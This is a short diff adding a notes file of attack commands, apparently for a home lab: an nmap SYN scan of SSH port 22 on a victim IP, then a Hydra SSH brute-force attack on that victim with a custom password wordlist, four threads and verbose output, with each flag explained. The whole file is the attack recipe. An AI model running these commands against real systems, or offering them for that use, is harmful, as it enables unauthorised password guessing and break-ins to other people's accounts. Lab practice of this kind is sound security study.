@@ -1,0 +1,12 @@
+# 🛰️ Nmap Port Scan (to identify open ports)
+nmap -sS -Pn -p 22 <vitcim-IP>
+
+
+
+# 🔐 Hydra SSH Brute Force Attack
+hydra -l <name> -P quickpass.txt ssh://<victim-IP> -t 4 -vV
+# Explanation:
+# -l <name>: login username (created on target Ubuntu)
+# -P quickpass.txt: custom password wordlist file
+# -t 4: number of parallel threads
+# -vV: verbose output
